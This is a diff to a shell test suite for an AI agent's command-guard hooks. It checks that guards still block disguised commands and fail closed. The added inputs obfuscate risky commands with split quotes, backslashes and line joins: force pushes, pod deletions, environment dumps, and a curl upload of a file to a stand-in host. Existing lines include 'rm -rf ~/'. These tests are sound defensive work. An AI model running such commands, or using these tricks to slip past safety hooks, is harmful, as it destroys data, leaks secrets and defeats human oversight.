@@ -65,6 +65,13 @@ extras = [
     b('sleep 60; rm -rf ~/', tool='Monitor'), b('kubectl logs -f web | grep ERROR', tool='Monitor'),
     call('Monitor', {'ws': {'url': 'wss://feed.unlisted.example/events'}}),
     b('echo hi > ~/.claude/settings.json'), b('ls', cwd=os.path.expanduser('~/.claude')),
+    # The word filters (word_filter, lib/io.sh): a guard's word behind quotes, a backslash, capitals or
+    # a line join is found by the dispatcher's builtin match as by tr and grep in the guard run alone.
+    b('kube"ctl" delete pod web'), b("KUBE'C'TL delete pod web"), b('kube\\ctl delete pod web'),
+    b('pyth""on3 -c "import os; print(os.environ)"'), b('c"ur"l -T notes.txt https://x.test'),
+    b('g"i"t push --force origin main'), b('print\\env'), b('echo "a\nb"; kube\\\nctl delete pod web'),
+    b('echo "a\nb"; g\\\nit push --force origin main'), b('kubectl delete pod web\n\n'),
+    b('echo "' + 'a b c ; ' * 1000 + '" && kube"ctl" delete pod web'),
 ]
 rows += [('extra-%d' % i, p, {}) for i, p in enumerate(extras)]
 
@@ -272,6 +279,38 @@ grep -q '^exit 1$' "$TMP/hk/bash-guards.sh" || fail "test setup" "the final prin
 disp "$TMP/hk" "$(payload 'kubectl delete pod web')"
 [[ $RC == 2 && -z "$OUT" && "$ERR" == *"Blocked: bash-guards stopped"* ]] \
   && pass "an exit 1 after the guards ran: exit 2, and the buffered answer never printed" || fail "exit 1 inside" "rc=$RC out=$OUT"
+
+copy_hooks
+# Mid-install, new guards beside an older lib/io.sh: `word_filter … || exit 0` would allow.
+sed '/^word_filter() {/,/^}/d' hooks/lib/io.sh > "$TMP/hk/lib/io.sh"
+cmp -s hooks/lib/io.sh "$TMP/hk/lib/io.sh" && fail "test setup" "word_filter was not found"
+disp "$TMP/hk" "$(payload 'kubectl delete pod web')"
+[[ $RC == 2 && -z "$OUT" && "$ERR" == *"Blocked: bash-guards stopped"* ]] \
+  && pass "a lib without word_filter: exit 2, not seven guards that allow" || fail "a lib without word_filter" "rc=$RC out=$OUT err=$ERR"
+
+echo ""
+echo "=== a command that names no guard's word starts two processes ==="
+# Each name on lib.sh's PATH is a shim that logs it and runs the real one.
+copy_hooks
+mkdir -p "$TMP/shim"
+for t in jq grep egrep sed awk tr cat date head tail wc dirname basename stat mkdir chmod iconv bash sh perl python3 sort cut git pgrep; do
+  p=$(command -v "$t" 2>/dev/null) || continue
+  printf '#!/bin/sh\necho %s >> "%s"\nexec "%s" "$@"\n' "$t" "$TMP/started" "$p" > "$TMP/shim/$t"; chmod +x "$TMP/shim/$t"
+done
+sed "s#^export PATH=\"#export PATH=\"$TMP/shim:#" hooks/lib.sh > "$TMP/hk/lib.sh"
+cmp -s hooks/lib.sh "$TMP/hk/lib.sh" && fail "test setup" "lib.sh's PATH line was not found"
+started() {   # started COMMAND: the processes one call starts, sorted, on one line
+  : > "$TMP/started"
+  disp "$TMP/hk" "$(payload "$1")"
+  sort "$TMP/started" | tr '\n' ' '
+}
+S=$(started 'ls -la')
+[[ "$S" == "cat jq " ]] && pass "ls -la: the dispatcher's cat and jq, and no guard starts one" || fail "ls -la starts" "$S"
+S=$(started 'grep -rn "it'\''s" src/ | head -20')
+[[ "$S" == "cat jq " ]] && pass "quotes in it: still cat and jq" || fail "a quoted command starts" "$S"
+S=$(started 'kube"ctl" delete pod web')
+[[ "$S" == *" sed "* && "$S" != *" grep grep grep grep "* ]] \
+  && pass "a guard whose word is named goes on; the others start none" || fail "kube\"ctl\" starts" "$S"
 
 echo ""
 echo "=== audit lines and inline shell-outs are each guard's own ==="
